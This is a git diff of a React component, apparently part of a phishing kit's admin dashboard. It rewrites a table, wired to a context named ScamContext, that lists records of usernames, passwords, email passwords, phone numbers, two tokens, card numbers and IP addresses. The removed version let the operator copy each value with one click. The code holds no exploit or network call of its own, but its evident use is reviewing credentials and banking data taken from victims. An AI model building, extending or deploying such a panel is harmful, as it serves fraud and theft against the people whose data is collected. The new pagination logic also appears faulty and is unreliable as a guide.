@@ -1,175 +1,161 @@
-import { EyeIcon } from '@heroicons/react/20/solid';
-import { Table, Tooltip } from '@nextui-org/react';
-import { useContext } from 'react';
-import { DeleteIcon } from '../../assets/DeleteIcon';
-import { IconButton } from '../../assets/IconButton';
-import { ScamContext } from '../../context/ScamContext';
-    
+import { Pagination } from '@nextui-org/react'
+import { useContext, useState } from 'react'
+import { DeleteIcon } from '../../assets/DeleteIcon'
+import { IconButton } from '../../assets/IconButton'
+import { ScamContext } from '../../context/ScamContext'
+import tableHeader from '../../options.json'
+
 export const TableUserAll = ({users}) => {
 
-  const { deleteUser } = useContext(ScamContext);
+  const { deleteUser, filteredType } = useContext(ScamContext);
 
+  const [currentPage, setCurrentPage] = useState(0);
+
+  const filteredUsers = () => {
+    return users.slice( currentPage === 0 ? 0 : currentPage - 10, currentPage === 0 ? currentPage + 10 : currentPage)
+  }
+
+  const pagination = (e) => {
+
+    const newData = e === 1 ? 0 : e * 10;
+    
+    setCurrentPage( newData  )
+  }
+  
   return (
-    <Table
-      className='border-0 outline-none'
-      borderWeight={0}
-      shadow={false}
-      compact
-      aria-label="Example table with static content"
-      css={{
-        height: "auto",
-        minWidth: "100%",
-      }}
-    >
-      <Table.Header >
-        <Table.Column>Usuario</Table.Column>
-        <Table.Column>Clave</Table.Column>
-        <Table.Column>Correo</Table.Column>
-        <Table.Column>Clave Correo</Table.Column>
-        <Table.Column>Celular</Table.Column>
-        <Table.Column>token1</Table.Column>
-        <Table.Column>token2</Table.Column>
-        <Table.Column>Tarjeta</Table.Column>
-        <Table.Column>ip</Table.Column>
-        <Table.Column>...</Table.Column>
-        
-      </Table.Header>
-      <Table.Body>
-        {
-          users.map( ({
-            _id,
-            username, 
-            password,
-            correo,
-            claveCorreo,
-            celular,
-            token1,
-            token2,
-            tarjeta,
-            ip
-          }, i) => (
-          <Table.Row key={i}>
-            <Table.Cell>
-              <Tooltip
-                content={'Copiado!'}
-                trigger={'click'}
-                color={"primary"}
-              >
-                <button onClick={() => Navigator.clipboard.writeText(username)}>
-                  {username}
-                </button>
-              </Tooltip>
-            </Table.Cell>
+    <>
+      <div className="overflow-x-auto">
+          <table className="table-auto w-full">
+              <thead className="text-xs font-semibold uppercase text-gray-400 bg-gray-50">
+                  <tr>
+                    {
+                      tableHeader.tableHeaderOptions.map( e => { 
+                        if(filteredType.includes(e) ) return ( 
+                          <th key={e} className="p-2 py-3 whitespace-nowrap">
+                            <div className='font-semibold text-left'>
+                              {e}
+                            </div>
+                          </th> 
+                        );
 
-            <Table.Cell>
-              <Tooltip
-                content={'Copiado!'}
-                trigger={'click'}
-                color={"primary"}
-              >
-                <button onClick={() => navigator.clipboard.writeText(password)}>
-                  {password}
-                </button>
-              </Tooltip>
-            </Table.Cell>
+                        if(e == 'usuario' || e == "clave" || e == "Ip" || e == "..." || filteredType.length === 1  ) return (
+                          <th key={e} className="p-2 py-3 whitespace-nowrap">
+                            <div className='font-semibold text-left'>
+                              {e}
+                            </div>
+                          </th> 
+                        );
+                      })
+                    }
+                  </tr>
+              </thead>
+              <tbody className="text-sm divide-y divide-gray-100">
+                {
+                  filteredUsers().map( ({_id, username, password, correo, claveCorreo, celular, token1, token2, tarjeta, ip }, i) => {
+                    return (
+                      <tr key={i}>
+                        <td className='p-2 py-3 whitespace-nowrap'>
+                          <div className="flex items-center">
+                            <div className="text-gray-800">{username}</div>
+                          </div>
+                        </td>
+                        <td className='p-2 py-3 whitespace-nowrap'>
+                          <div className="flex items-center">
+                            <div className="text-gray-800">{password}</div>
+                          </div>
+                        </td>
+                        {/* Filtro de correo */}
+                        {
+                          (filteredType.includes('Correo') || filteredType.length === 1) && (
+                            <td className='p-2 py-3 whitespace-nowrap'>
+                              <div className="flex items-center">
+                                <div className="text-gray-800">{correo}</div>
+                              </div>
+                            </td>
+                          )
+                        }
+                        {
+                          (filteredType.includes('Clave del correo') || filteredType.length === 1) && (
+                            <td className='p-2 py-3 whitespace-nowrap'>
+                              <div className="flex items-center">
+                                <div className="text-gray-800">{claveCorreo}</div>
+                              </div>
+                            </td>
+                          )
+                        }
+                        {
+                          (filteredType.includes('Celular') || filteredType.length === 1) && (
+                            <td className='p-2 py-3 whitespace-nowrap'>
+                              <div className="flex items-center">
+                                <div className="text-gray-800">{celular}</div>
+                              </div>
+                            </td>
+                          )
+                        }
+                        {
+                          (filteredType.includes('Token1') || filteredType.length === 1) && (
+                            <td className='p-2 py-3 whitespace-nowrap'>
+                              <div className="flex items-center">
+                                <div className="text-gray-800">{token1}</div>
+                              </div>
+                            </td>
+                          )
+                        }
+                        {
+                          (filteredType.includes('Token2') || filteredType.length === 1) && (
+                            <td className='p-2 py-3 whitespace-nowrap'>
+                              <div className="flex items-center">
+                                <div className="text-gray-800">{token2}</div>
+                              </div>
+                            </td>
+                          )
+                        }
+                        {
+                          (filteredType.includes('Tarjeta') || filteredType.length === 1) && (
+                            <td className='p-2 py-3 whitespace-nowrap'>
+                              <div className="flex items-center">
+                                <div className="text-gray-800">{tarjeta}</div>
+                              </div>
+                            </td>
+                          )
+                        }
+                        <td className='p-2 py-3 whitespace-nowrap'>
+                          <div className="flex items-center">
+                            <div className="text-gray-800">{ip}</div>
+                          </div>
+                        </td>
 
-            <Table.Cell>
-              <Tooltip
-                content={'Copiado!'}
-                trigger={'click'}
-                color={"primary"}
-              >
-                <button onClick={() => navigator.clipboard.writeText(correo)}>
-                  {correo}
-                </button>
-              </Tooltip>
-            </Table.Cell>
-            
-            <Table.Cell>
-              <Tooltip
-                content={'Copiado!'}
-                trigger={'click'}
-                color={"primary"}
-              >
-                <button onClick={() => navigator.clipboard.writeText(claveCorreo)}>
-                  {claveCorreo}
-                </button>
-              </Tooltip>
-            </Table.Cell>
-            
-            <Table.Cell>
-              <Tooltip
-                content={'Copiado!'}
-                trigger={'click'}
-                color={"primary"}
-              >
-                <button onClick={() => navigator.clipboard.writeText(celular)}>
-                  {celular}
-                </button>
-              </Tooltip>
-            </Table.Cell>
-
-            <Table.Cell>
-              <Tooltip
-                content={'Copiado!'}
-                trigger={'click'}
-                color={"primary"}
-              >
-                <button onClick={() => navigator.clipboard.writeText(token1)}>
-                  {token1}
-                </button>
-              </Tooltip>
-            </Table.Cell>
-
-            <Table.Cell>
-              <Tooltip
-                content={'Copiado!'}
-                trigger={'click'}
-                color={"primary"}
-              >
-                <button onClick={() => navigator.clipboard.writeText(token2)}>
-                  {token2}
-                </button>
-              </Tooltip>
-            </Table.Cell>
-
-            <Table.Cell>
-              <Tooltip
-                content={'Copiado!'}
-                trigger={'click'}
-                color={"primary"}
-              >
-                <button onClick={() => navigator.clipboard.writeText(tarjeta)}>
-                  {tarjeta}
-                </button>
-              </Tooltip>
-            </Table.Cell>
-
-            <Table.Cell>{ip}</Table.Cell>
-            <Table.Cell>
-              <IconButton onClick={() => deleteUser({_id})}>
-                <DeleteIcon size={18} fill="#FF0080" />
-              </IconButton>
-            </Table.Cell>
-          </Table.Row>
-          ) )
-        }
-      </Table.Body>
-      <Table.Pagination
-        shadow
-        noMargin
-        align="start"
-        rowsPerPage={10}
-        loop
-        total={
-          users.length >= 10 ? 
+                        <td className='p-2 py-3 whitespace-nowrap'>
+                          <div className="flex items-center">
+                            <IconButton onClick={() => deleteUser({_id})}>
+                              <DeleteIcon size={18} fill="#FF0080" />
+                            </IconButton>
+                          </div>
+                        </td>
+                      </tr>
+                    )
+                  })
+                }
+              </tbody>
+          </table>
+      </div>
+      <div className='mt-10'>
+        <Pagination 
+          total={          
+            users.length >= 10 ? 
             Number.isInteger(users.length / 10) === false 
             ? Math.round(users.length / 10 + 1)
             : Math.round(users.length / 10 )
-           : 1
-        }
-        initialPage={1}
-      />
-    </Table>
+            : 1
+          }
+          loop
+          noMargin
+          shadow
+          initialPage={1}
+          onChange={(e) => pagination(e) }
+          
+          />
+      </div>
+    </>
   );
 }
